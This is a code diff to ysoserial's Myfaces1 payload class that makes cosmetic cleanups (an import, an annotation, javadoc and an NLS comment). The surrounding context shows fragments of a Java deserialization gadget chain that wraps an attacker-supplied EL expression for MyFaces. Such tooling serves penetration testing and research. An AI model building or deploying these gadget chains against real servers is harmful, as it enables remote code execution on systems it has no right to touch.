@@ -1,7 +1,6 @@
 package ysoserial.payloads;
 
 
-import java.lang.reflect.InvocationTargetException;
 
 import javax.el.ELContext;
 import javax.el.ExpressionFactory;
@@ -40,9 +39,6 @@ import ysoserial.payloads.util.Reflections;
  * 
  * @author mbechler
  */
-@SuppressWarnings ( {
-    "nls", "javadoc"
-} )
 @PayloadTest(skip="Requires running MyFaces, no direct execution")
 public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies {
 
@@ -81,19 +77,6 @@ public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies {
         throw new IllegalArgumentException("Invalid el type " + System.getProperty("el"));
     }
 
-
-    /**
-     * @param expr
-     * @return
-     * @throws IllegalArgumentException 
-     * @throws NoSuchFieldException
-     * @throws IllegalAccessException
-     * @throws Exception
-     * @throws ClassNotFoundException
-     * @throws NoSuchMethodException
-     * @throws InstantiationException
-     * @throws InvocationTargetException
-     */
     public static Object makeExpressionPayload ( String expr ) throws IllegalArgumentException, IllegalAccessException, Exception  {
         FacesContextImpl fc = new FacesContextImpl((ServletContext) null, (ServletRequest) null, (ServletResponse) null);
         ELContext elContext = new FacesELContext(new CompositeELResolver(), fc);
@@ -102,7 +85,7 @@ public class Myfaces1 implements ObjectPayload<Object>, DynamicDependencies {
         
         ValueExpression ve1 = expressionFactory.createValueExpression(elContext, expr, Object.class);
         ValueExpressionMethodExpression e = new ValueExpressionMethodExpression(ve1);
-        ValueExpression ve2 = expressionFactory.createValueExpression(elContext, "${true}", Object.class); //$NON-NLS-1$
+        ValueExpression ve2 = expressionFactory.createValueExpression(elContext, "${true}", Object.class);
         ValueExpressionMethodExpression e2 = new ValueExpressionMethodExpression(ve2);
 
         return Gadgets.makeMap(e2, e);
